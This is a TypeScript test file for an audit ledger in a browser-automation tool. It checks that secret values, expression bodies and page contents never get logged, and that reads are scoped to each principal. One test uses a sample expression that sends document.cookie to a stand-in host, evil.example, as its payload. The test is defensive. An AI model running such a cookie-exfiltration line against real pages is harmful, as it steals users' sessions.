/** The audit ledger's contract. */
import { assert, assertEquals } from '@std/assert';
import { AUDIT_RING_CAPACITY, AuditLedger, expressionDigest } from './audit.ts';

const SENTINEL = 'Zq8-LEDGER-SENTINEL-3vP';

function ledger(capacity?: number): AuditLedger {
	let tick = 1_700_000_000_000;
	return new AuditLedger({ ...(capacity === undefined ? {} : { capacity }), now: () => tick++ });
}

Deno.test('audit: a secret-fill entry carries the NAME and nothing that could be the value', () => {
	const led = ledger();
	const entry = led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'secret-fill',
		frame_id: 'F1',
		origin: 'https://bank.example.com',
		secret: 'bank_password',
		index: 7,
		ok: true,
	});
	assertEquals(entry.secret, 'bank_password');
	assertEquals(entry.kind, 'secret-fill');
	assertEquals(entry.expression_bytes, undefined);
	assertEquals(entry.expression_digest, undefined);
	assert(!JSON.stringify(led.read({ principal: 'p1' })).includes(SENTINEL));
});

Deno.test('audit: a seeded secret value appears nowhere in the serialized ledger', () => {
	const led = ledger();
	led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'secret-fill',
		frame_id: 'F1',
		origin: 'https://bank.example.com',
		secret: 'bank_password',
		index: 7,
		ok: true,
	});
	const serialized = JSON.stringify(led.read({ principal: 'p1', all: true }));
	assert(!serialized.includes(SENTINEL), serialized);
	assert(!serialized.includes(SENTINEL.slice(0, 6)), serialized);
	assert(!serialized.includes(`"length":${SENTINEL.length}`), serialized);
});

Deno.test('audit: an evaluate entry records length and digest, never the expression body', async () => {
	const led = ledger();
	const expression = `fetch('https://evil.example/?c='+document.cookie+'${SENTINEL}')`;
	const entry = led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'evaluate',
		frame_id: 'F1',
		origin: 'https://app.example.com',
		expression_bytes: new TextEncoder().encode(expression).length,
		expression_digest: await expressionDigest(expression),
		result_bytes: 0,
		ok: true,
	});
	assertEquals(entry.expression_bytes, new TextEncoder().encode(expression).length);
	assertEquals(entry.expression_digest?.length, 16);
	const serialized = JSON.stringify(led.read({ principal: 'p1' }));
	assert(!serialized.includes(SENTINEL), 'the expression body reached the ledger');
	assert(!serialized.includes('fetch('), 'an expression prefix reached the ledger');
	assert(!serialized.includes('document.cookie'), 'an expression fragment reached the ledger');
});

Deno.test('audit: the digest is stable, 16 hex characters, and distinguishes two expressions', async () => {
	const a = await expressionDigest('1 + 1');
	const b = await expressionDigest('1 + 2');
	assertEquals(a, await expressionDigest('1 + 1'));
	assert(a !== b);
	assert(/^[0-9a-f]{16}$/.test(a), a);
});

Deno.test('audit: a read under mcp:invoke returns only the caller’s own entries', () => {
	const led = ledger();
	for (const principal of ['alice', 'bob', 'alice']) {
		led.append({ session_id: 's1', principal, kind: 'evaluate', frame_id: 'F', origin: 'https://a.example', ok: true });
	}
	const own = led.read({ principal: 'alice' });
	assertEquals(own.scope, 'own');
	assertEquals(own.entries.length, 2);
	assertEquals(new Set(own.entries.map((entry) => entry.principal)), new Set(['alice']));

	const all = led.read({ principal: 'alice', all: true });
	assertEquals(all.scope, 'all');
	assertEquals(all.entries.length, 3);
});

Deno.test('audit: the filter runs before the page, so a short page cannot count another principal', () => {
	const led = ledger();
	for (let i = 0; i < 10; i++) {
		led.append({ session_id: 's', principal: 'bob', kind: 'evaluate', frame_id: 'F', origin: 'https://a.example' });
	}
	led.append({ session_id: 's', principal: 'alice', kind: 'evaluate', frame_id: 'F', origin: 'https://a.example' });
	assertEquals(led.read({ principal: 'alice', limit: 5 }).entries.length, 1);
});

Deno.test('audit: `since` pages forward on the sortable id', () => {
	const led = ledger();
	const first = led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: 'F', origin: 'https://a' });
	const second = led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: 'F', origin: 'https://a' });
	assert(second.audit_id > first.audit_id, `${second.audit_id} must sort after ${first.audit_id}`);
	const page = led.read({ principal: 'p', since: first.audit_id });
	assertEquals(page.entries.map((entry) => entry.audit_id), [second.audit_id]);
});

Deno.test('audit: the ring evicts oldest-first and reports what it dropped', () => {
	const led = ledger(3);
	for (let i = 0; i < 5; i++) {
		led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: `F${i}`, origin: 'https://a' });
	}
	const read = led.read({ principal: 'p' });
	assertEquals(read.entries.length, 3);
	assertEquals(read.dropped, 2);
	assertEquals(read.entries.map((entry) => entry.frame_id), ['F2', 'F3', 'F4']);
});

Deno.test('audit: the default capacity is 200, not the lifecycle ring’s 50', () => {
	assertEquals(AUDIT_RING_CAPACITY, 200);
	const led = ledger();
	for (let i = 0; i < AUDIT_RING_CAPACITY + 1; i++) {
		led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: 'F', origin: 'https://a' });
	}
	assertEquals(led.size, AUDIT_RING_CAPACITY);
	assertEquals(led.dropped, 1);
});

Deno.test('audit: the producer cannot choose audit_id or at', () => {
	const led = ledger();
	const forged = { audit_id: 'FORGED', at: '1999-01-01T00:00:00.000Z' } as unknown as Record<string, unknown>;
	const entry = led.append({
		session_id: 's',
		principal: 'p',
		kind: 'evaluate',
		frame_id: 'F',
		origin: 'https://a',
		...forged,
	} as never);
	assert(entry.audit_id !== 'FORGED');
	assert(!entry.at.startsWith('1999'));
});

Deno.test('audit: the module writes no file — there is no filesystem API to reach', async () => {
	const source = await Deno.readTextFile(new URL('./audit.ts', import.meta.url));
	const reached = [...source.matchAll(/\bDeno\.[A-Za-z]+/g)].map((match) => match[0]);
	assertEquals(reached, [], `audit.ts must not reach the runtime API: ${reached.join(', ')}`);
	assert(!source.includes('localStorage'), 'audit.ts must not reach browser-style storage either');
});

/** The third kind's exact key set. */
Deno.test('audit: a read-frame-html entry is exactly {identity, frame, origin, size, ok}', () => {
	const led = ledger();
	const entry = led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'read-frame-html',
		frame_id: 'F-CHILD',
		origin: 'http://127.0.0.1:38112',
		result_bytes: 4096,
		ok: true,
	});
	assertEquals(
		Object.keys(entry).sort(),
		['at', 'audit_id', 'frame_id', 'kind', 'ok', 'origin', 'principal', 'result_bytes', 'session_id'],
	);
	assertEquals(entry.kind, 'read-frame-html');
	assertEquals(entry.expression_bytes, undefined);
	assertEquals(entry.expression_digest, undefined);
	assertEquals(entry.secret, undefined);
	assertEquals(entry.index, undefined);
	assertEquals(entry.ok, true);
});

Deno.test('audit: a document read into the ledger discloses its size and its origin, never its bytes', () => {
	const led = ledger();
	const document = `<html><body><p>${SENTINEL}</p></body></html>`;
	led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'read-frame-html',
		frame_id: 'F-CHILD',
		origin: 'https://login.example.com',
		result_bytes: new TextEncoder().encode(document).length,
		ok: true,
	});
	const serialized = JSON.stringify(led.read({ principal: 'p1', all: true }));
	assert(!serialized.includes(SENTINEL), 'a document byte reached the ledger');
	assert(!serialized.includes(SENTINEL.slice(0, 6)), 'a document prefix reached the ledger');
	assert(!serialized.includes('<html'), 'document markup reached the ledger');
	assert(serialized.includes(`"result_bytes":${new TextEncoder().encode(document).length}`), serialized);
});
